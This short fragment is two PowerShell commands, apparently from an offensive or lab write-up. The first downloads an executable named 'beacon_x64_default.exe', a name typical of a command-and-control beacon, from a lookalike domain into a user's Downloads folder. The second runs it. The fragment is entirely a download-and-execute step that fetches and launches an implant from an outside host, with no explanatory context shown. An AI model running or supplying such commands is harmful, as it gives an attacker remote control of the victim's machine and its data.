...
```
iwr -Uri "http://www.bleepincomputer.com/beacon_x64_default.exe" -OutFile "C:\Users\pchilds\Downloads\beacon_x64_default.exe" 
Start-Process -FilePath "C:\Users\pchilds\Downloads\beacon_x64_default.exe"
```
